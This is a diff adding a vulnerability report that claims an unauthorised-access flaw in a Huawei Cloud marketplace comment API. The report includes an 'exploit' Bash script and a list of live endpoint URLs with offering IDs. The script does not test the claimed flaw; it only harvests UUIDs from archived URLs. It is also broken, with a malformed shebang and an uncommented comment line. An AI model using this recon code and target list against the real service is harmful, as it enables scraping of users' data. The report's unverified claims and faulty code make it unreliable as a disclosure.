@@ -1,0 +1,53 @@
+Summary:
+A vulnerability has been identified in the CBC Marketplace Comment Service, which allows unauthorized users to access sensitive information such as user answers and comments, as well as extract UUIDs and encrypted IDs. This vulnerability can be exploited by manipulating the URL parameters in the API endpoint.
+
+Vulnerability Details:
+The vulnerability exists in the CBC Marketplace Comment Service API, specifically in the "question/all" endpoint. By manipulating the "offering_id" parameter, an attacker can retrieve user answers and comments without proper authorization. Additionally, the UUIDs and encrypted IDs associated with the comments can also be extracted.
+
+Exploit Code:
+The following Bash code demonstrates how the vulnerability can be exploited:
+
+!/bin/bash
+URL="https://web.archive.org/cdx/search/cdx?url=*.mkpdata.huaweicloud.com&output=text&fl=original&collapse=urlkey"
+OUTPUT_FILE="uuid.txt"
+
+Curl the URL, grep UUIDs, and save them in the output file
+curl_output=$(curl -s "$URL" | grep -oE '\b[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}\b')
+echo "$curl_output" > "$OUTPUT_FILE"
+
+echo "UUIDs saved in $OUTPUT_FILE"
+
+Impact:
+This vulnerability exposes sensitive user information, including their answers and comments, which may contain personally identifiable information (PII) or confidential data. Additionally, the extraction of UUIDs and encrypted IDs can potentially be leveraged for further attacks or unauthorized access to the system.
+
+Recommended Actions:
+
+Implement proper access controls and authentication mechanisms to restrict access to user answers and comments.
+Apply input validation and sanitization techniques to prevent manipulation of URL parameters.
+Encrypt or obfuscate sensitive information stored in the CBC Marketplace Comment Service database.
+Regularly monitor and log API requests to detect any unauthorized access attempts.
+Mitigation:
+We recommend applying the following measures to mitigate the identified vulnerability:
+
+Conduct a thorough code review of the CBC Marketplace Comment Service to identify any other potential information disclosure vulnerabilities.
+Implement a robust authentication and authorization system that ensures only authorized users can access user answers and comments.
+Encrypt or tokenize sensitive data stored in the CBC Marketplace Comment Service database to protect against unauthorized extraction.
+Regularly update and patch the CBC Marketplace Comment Service to address any security vulnerabilities.
+
+URLs:
+https://mkpdata.huaweicloud.com/rest/rest/cbc/cbcmarketplacecommentservice/v1/question/all?offering_id=42a16d27-db96-407d-a756-76d8fdc92313&offset=0&limit=50
+https://mkpdata.huaweicloud.com/rest/rest/cbc/cbcmarketplacecommentservice/v1/question/all?offering_id=4cc2f496-e36e-47ba-8d90-abbbdc23cdda&offset=0&limit=50
+https://mkpdata.huaweicloud.com/rest/rest/cbc/cbcmarketplacecommentservice/v1/question/all?offering_id=5b47c46d-df58-471e-b64c-14d47d75d295&offset=0&limit=50
+https://mkpdata.huaweicloud.com/rest/rest/cbc/cbcmarketplacecommentservice/v1/question/all?offering_id=eba284cb-7c6a-42af-a3d2-44a6f695c93e&offset=0&limit=50
+https://mkpdata.huaweicloud.com/rest/rest/cbc/cbcmarketplacecommentservice/v1/question/all?offering_id=e1ff556d-a43c-4535-97e5-19de7709d806&offset=0&limit=50
+https://mkpdata.huaweicloud.com/rest/rest/cbc/cbcmarketplacecommentservice/v1/question/all?offering_id=5175e9bc-e1e1-4243-ac3f-45a81f6980f7&offset=0&limit=50
+https://mkpdata.huaweicloud.com/rest/rest/cbc/cbcmarketplacecommentservice/v1/question/all?offering_id=ef750023-f243-4bea-8f59-d059b6bddcbf&offset=0&limit=50
+https://mkpdata.huaweicloud.com/rest/rest/cbc/cbcmarketplacecommentservice/v1/question/all?offering_id=6c8a375a-4cdf-40c7-b7b6-4af9173f9e16&offset=0&limit=50
+https://mkpdata.huaweicloud.com/rest/rest/cbc/cbcmarketplacecommentservice/v1/question/all?offering_id=817ab039-aff1-4edd-917d-f64c5ffc992d&offset=0&limit=50
+https://mkpdata.huaweicloud.com/rest/rest/cbc/cbcmarketplacecommentservice/v1/question/all?offering_id=0cadf157-b54f-43b1-b94b-e56c1fda3c8f&offset=0&limit=50
+https://mkpdata.huaweicloud.com/rest/rest/cbc/cbcmarketplacecommentservice/v1/question/all?offering_id=0cadf157-b54f-43b1-b94b-e56c1fda3c8f&offset=0&limit=50
+https://mkpdata.huaweicloud.com/rest/rest/cbc/cbcmarketplacecommentservice/v1/question/all?offering_id=e11b9137-bd1c-4dbb-8ae5-afbf44f1e244&offset=0&limit=50
+https://mkpdata.huaweicloud.com/rest/rest/cbc/cbcmarketplacecommentservice/v1/question/all?offering_id=e11b9137-bd1c-4dbb-8ae5-afbf44f1e244&offset=0&limit=50
+https://mkpdata.huaweicloud.com/rest/rest/cbc/cbcmarketplacecommentservice/v1/question/all?offering_id=13df60e0-6a6e-4e2a-8775-55dbca5b0ff0&offset=0&limit=50
+https://mkpdata.huaweicloud.com/rest/rest/cbc/cbcmarketplacecommentservice/v1/question/all?offering_id=13df60e0-6a6e-4e2a-8775-55dbca5b0ff0&offset=0&limit=50
+
